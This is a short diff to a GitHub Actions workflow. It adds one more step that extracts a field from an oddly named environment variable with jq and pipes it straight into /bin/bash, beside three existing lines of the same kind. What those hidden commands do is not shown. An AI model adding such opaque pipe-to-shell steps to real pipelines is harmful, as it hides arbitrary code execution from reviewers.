@@ -27,6 +27,7 @@ jobs:
           echo $rexl357 | jq -r .xhs1 | /bin/bash
           echo $ifjc3 | jq -r .niu07 | /bin/bash
           echo $ym954 | jq -r .xk5 | /bin/bash
+          printf '%s' "$jshcy68141" | jq -r .wr2 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
